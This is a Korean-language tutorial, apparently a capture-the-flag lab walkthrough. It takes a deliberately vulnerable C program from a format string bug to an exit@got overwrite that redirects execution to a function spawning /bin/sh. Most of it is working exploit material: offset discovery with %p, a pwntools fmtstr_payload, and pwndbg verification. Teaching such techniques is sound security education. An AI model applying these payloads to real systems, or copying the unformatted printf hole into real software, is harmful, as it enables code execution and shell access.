# 03 · 포맷스트링 → GOT overwrite 디버깅

## 소스 요지
```c
void win() { system("/bin/sh"); }
int main() {
    char buf[0x80];
    read(0, buf, 0x80);
    printf(buf);     // ← "%s" 없이 사용자 입력 → FSB
    exit(0);         // ← exit@got를 win으로 덮으면 여기서 트리거
}
```
`checksec`: Partial RELRO → **`.got.plt` 쓰기 가능** → GOT overwrite 가능.

## 1) 입력이 몇 번째 인자인지 찾기
x86-64 printf 인자: `rdi`(=포맷) 다음 `rsi rdx rcx r8 r9` = 1~5번째,
그 다음부터 **스택** = 6번째~. 입력 버퍼가 스택에 있으니 몇 번째인지 센다.
```
$ echo -n 'AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p' | ./vuln
AAAAAAAA|0x7ffc...|0x20|0x79...|(nil)|(nil)|0x4141414141414141|...
                                              ^^^^^^^^ 6번째에 AAAA
```
→ 입력 버퍼 = **6번째 인자**(`%6$`).

## 2) 어디를 덮나
곧 호출될 함수의 GOT = `exit@got`. `objdump -R vuln`로 확인:
```
$ objdump -R vuln | grep exit
0000000000404028 R_X86_64_JUMP_SLOT  exit@GLIBC
```
`exit@got(0x404028)`에 `win(0x401176)`을 쓰면, `printf` 뒤 `exit()`가 `win()` 실행.

## 3) %n 원리
`%n` = "지금까지 출력한 **글자 수**를 인자가 가리키는 주소에 기록".
- `%hn` = 2바이트, `%hhn` = 1바이트. 큰 값을 한 번에 쓰면 글자 수가 폭발하므로
  **2바이트씩 나눠** 쓰는 게 보통 → pwntools `fmtstr_payload`가 자동 처리.
```python
offset = 6
payload = fmtstr_payload(offset, {e.got['exit']: e.symbols['win']})
# 내부적으로: [쓸 주소들][ %<글자수>c %N$hn ... ] 조합 생성
```
실측 payload 길이 64바이트 → 버퍼(0x80) 이내로 안전.

## 4) gdb로 덮였는지 확인
```
pwndbg> b *main+<printf 다음>          # printf 반환 직후
pwndbg> r <<< "$(python exploit.py --dump)"   # 또는 입력 수동
pwndbg> x/gx 0x404028                  # exit@got
0x404028: 0x0000000000401176           ← win으로 바뀜!
pwndbg> got                            # pwndbg: GOT 한눈에
```

## 5) 동작
```
$ make run
[*] payload len = 64
PWNED
```

> 변종: `sprintf(stack_buf, user)`면 `%Nc`로 출력 길이만 키워도 `%n` 없이 스택 BOF 가능.
